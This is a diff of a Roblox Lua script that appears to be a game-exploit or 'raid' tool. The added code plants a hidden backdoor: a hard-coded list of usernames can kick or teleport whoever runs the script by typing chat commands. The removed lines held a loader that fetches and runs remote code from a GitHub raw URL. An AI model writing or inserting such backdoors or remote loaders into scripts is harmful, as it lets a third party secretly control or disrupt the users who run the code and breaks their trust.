@@ -1,3 +1,28 @@
+local kickers = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
+
+local player = game.Players.LocalPlayer
+
+game.Players.PlayerAdded:Connect(function()
+    for i, kicker in pairs(kickers) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == kicker and msg == "/kick "..player.Name then
+                    player:Kick("You have been kicked by the owner")
+                end
+            end)
+        end
+    end
+        for i, kicker in pairs(kickers) do
+        for i, v in pairs(game.Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg)
+                if v.Name == kicker and msg == "/bring "..player.Name then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+                end
+            end)
+        end
+    end
+end)
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -697,19 +722,4 @@ raidLoop() -- Start the raid loop
  end
 )
         end } )
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Owner%20power"))()
-local kickers = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
-
-
-while wait() do
-for _,kicker in pairs(kickers) do
-for i,v in pairs(game.Players:GetPlayers()) do
-v.Chatted:Connect(function(msg)
-if v.Name == kicker and msg == "/kick "..game.Players.LocalPlayer.Name then
-game.Players.LocalPlayer:Kick("You have been kicked by the owner")
-end
-end)
-end
-end
-end
 end
